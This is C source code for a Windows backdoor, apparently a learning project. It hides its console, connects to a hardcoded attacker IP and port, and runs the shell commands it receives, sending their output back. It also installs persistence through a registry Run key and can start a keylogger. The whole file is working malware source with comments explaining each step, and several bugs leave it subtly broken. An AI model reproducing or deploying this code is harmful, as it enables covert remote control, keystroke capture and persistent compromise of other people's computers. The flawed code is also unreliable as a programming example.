//compile with -mwindows flag as it is a windows GUI program
//also use -lsw2_32 flag to be able to use the winsock library functions


#include <stdio.h>
#include <windows.h>
#include <winsock.h>
#include <string.h>
#include <unistd.h>
#include <winuser.h>
#include <wininet.h>
#include <stdlib.h>
#include <windowsx.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "keylogger.h"
#define bzero(p,size) (void)(memset((p),0,(size)))


int sock;
//persistence function
int bootRun()
{
    char err[128]="Failed to create persistence..";
    char suc[128]="Created persistence successfully..";
    //Computer\HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    //this is the path where the bootrunning applications are stored.
    TCHAR szPath[MAX_PATH]; //possible maximum size of the path for our system.
    DWORD pathLen = 0;
    pathLen = GetModuleFileNameA(NULL,szPath,MAX_PATH); //gives the whole path of the current file module
    if(pathLen==0){
        send(sock,err,sizeof(err));
        return -1;
    }
    HKEY NewVal;

    if(RegOpenKey(HKEY_CURRENT_USER,TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"),&NewVal)!=ERROR_SUCCESS) //TEXT gives us a pointer to a string
    {
        send(sock,err,sizeof(err),0);
        return -1;
    }
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);
    if(RegSetValueEx(NewVal,TEXT("HACKED"),0,REG_SZ,(LPBYTE)szPath,pathLenInBytes)!=ERROR_SUCCESS){
        RegCloseKey(NewVal);
        send(sock,err,sizeof(err),0);
        return -1;
    }
    RegCloseKey(NewVal);
    send(sock,suc,sizeof(suc),0);//else the success string will be sent to the hacker
    return 0;
}
char *str_cut(char str[],int slice_from,int slice_to){
    if(str[0]=='\0')
    {
        return NULL;
    }
    char *buffer;
    size_t str_len,buffer_len;
    if(slice_to<0 && slice_from>slice_to){
        str_len = strlen(str);
        if(abs(slice_to) > str_len - 1)
            return NULL;
        if(abs(slice_from)>str_len)
            slice_from = (-1)*str_len;
        buffer_len = slice_to - slice_from;
        str+=(str_len + slice_from);
    }
    else if(slice_from >=0 && slice_to>slice_from){
        str_len = strlen(str);
        if(slice_from > str_len -1 )
            return NULL;
        buffer_len = slice_to - slice_from;
        str += slice_from;


    }
    else
        return NULL;


}

void Shell()
{
    char buffer[1024]; //used to receive all the commands
    char container[1024];
    char total_response[20000]; //this is the hisory of all the commands given
    
    while(TRUE){
        jump:
            bzero(buffer,1024);
            bzero(container,1024);
            bzero(total_response,20000);
            recv(sock,buffer,1024,0
//   [in]  SOCKET s,
//   [out] char   *buf,
//   [in]  int    len,
//   [in]  int    flags
            );
            if (strncmp("q",buffer,1)==0){
                closesocket(sock);
                WSACleanup();
                exit(0);
            }
            //traversing through different directories
            else if(strncmp("cd ",buffer,3)==0){
                chdir(str_cut(buffer,3,100)) //this will be able to get us to change the directory wherever we want 
            }
            else if(strncmp("persist",buffer,7)==0){
                bootRun();
            }
            else if(strncmp("keylog_start",buffer,12)==0){
                HANDLE thread = CreateThread(NULL,0,logg,NULL,0,NULL);
                goto jump;
            }
            else{
                FILE* fptr;
                fptr =_popen(buffer,"r"); //opens the process where we open the buffer into read mode
                while(fgets(container,1024,fptr)!=NULL){ 
                    //if the receiving content is finished then we will get EOF and we will get the fptr equal to null, this will mark the end of the receiving response
                    //thus we paste the response into the total_response buffer and then we will move onto thwe next set of 10214 bytes in the respinse in the next iteration.

                    strcat(total_response,container);
                    //Now we have to send the response to the server
                    send(sock,total_response,sizeof(total_response),0);
                    fclose(fptr);
                }
            }


    }

}

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrev,LPSTR lpCmdline,int nCmdShow){
    // HWND stealth;
    AllocConsole(); //this function will allocate a new console for this process
    HWND stealth = FindWindowA("ConsoleWindowClass",NULL 
//   [in, optional] LPCSTR lpClassName,
//   [in, optional] LPCSTR lpWindowName
);
ShowWindow(stealth,0
//   [in] HWND hWnd,
//   [in] int  nCmdShow
);
//this will hide the console and the program from the user.

struct sockaddr_in ServAddr;
unsigned short ServPort;
char* ServIP;
WSADATA wsadata;
//this is a struct in thwe windows library that have info about the functions in windows API
ServIP = "192.168.145.130";
ServPort = 5000;
if(WSAStartup(MAKEWORD(2,0),&wsadata)!=0){ //this initializes the use of winsock dll
//MAKEWORD is to concatenate a high bit and low bit and ,ake a whole word or hex digit out of the both

    exit(1);
}

//Now to make a socket
sock = socket(AF_INET,SOCK_STREAM,0); //uses IPv4,TCP,defined for all platforms
memset(&ServAddr,0,sizeof(ServAddr));//sets the wholw ServAddr location on the program as null bytes sled
ServAddr.sin_family = AF_INET;
ServAddr.sin_addr.s_addr = inet_addr(ServIP);
ServAddr.sin_port = htons(ServPort);
//this all is to set the address IP and the port into the socket defined 

//For connection
//we have to try to make the connection again and again to be able to actually connect to the server
start:
while (connect(sock,(struct sockaddr *) &ServAddr, sizeof(ServAddr))!=0){
    Sleep(10); //this takes input as seconds only
    goto start;
}
//After this the program will inly execute if the connection is made throught the backdoor

Shell();

}

